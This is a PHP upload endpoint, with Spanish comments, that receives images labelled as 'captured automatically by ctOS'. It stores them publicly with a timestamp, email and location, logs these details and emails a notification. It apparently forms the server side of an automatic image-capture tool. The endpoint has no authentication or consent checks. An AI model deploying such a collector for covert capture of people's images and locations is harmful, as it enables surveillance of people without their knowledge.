<?php
// servidor_recibir_imagen.php
// Subir a tu servidor web propio para máxima autonomía

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Directorio para guardar imágenes
    $upload_dir = 'ctos_images/';
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    
    // Recibir imagen
    if (isset($_FILES['image'])) {
        $timestamp = $_POST['timestamp'] ?? date('Y-m-d H:i:s');
        $email = $_POST['email'] ?? 'unknown';
        $location = $_POST['location'] ?? 'unknown';
        
        // Nombre único del archivo
        $filename = 'ctOS_' . date('Ymd_His') . '_' . uniqid() . '.jpg';
        $filepath = $upload_dir . $filename;
        
        if (move_uploaded_file($_FILES['image']['tmp_name'], $filepath)) {
            
            // Opcional: Enviar email de notificación
            if (!empty($email) && filter_var($email, FILTER_VALIDATE_EMAIL)) {
                $subject = "🔍 ctOS - Nueva imagen capturada";
                $message = "
                🕒 Timestamp: $timestamp
                📍 Ubicación: $location
                🔗 Imagen: https://tuservidor.com/$filepath
                
                Imagen capturada automáticamente por ctOS.
                ";
                
                $headers = "From: noreply@tuservidor.com\r\n";
                $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
                
                mail($email, $subject, $message, $headers);
            }
            
            // Log de la captura
            $log_entry = date('Y-m-d H:i:s') . " - Imagen: $filename - Email: $email - Ubicación: $location\n";
            file_put_contents('ctos_log.txt', $log_entry, FILE_APPEND);
            
            echo json_encode([
                'success' => true,
                'filename' => $filename,
                'url' => "https://tuservidor.com/$filepath",
                'message' => 'Imagen subida y email enviado correctamente'
            ]);
            
        } else {
            http_response_code(500);
            echo json_encode(['error' => 'Error al guardar la imagen']);
        }
        
    } else {
        http_response_code(400);
        echo json_encode(['error' => 'No se recibió ninguna imagen']);
    }
    
} else {
    http_response_code(405);
    echo json_encode(['error' => 'Método no permitido']);
}
?>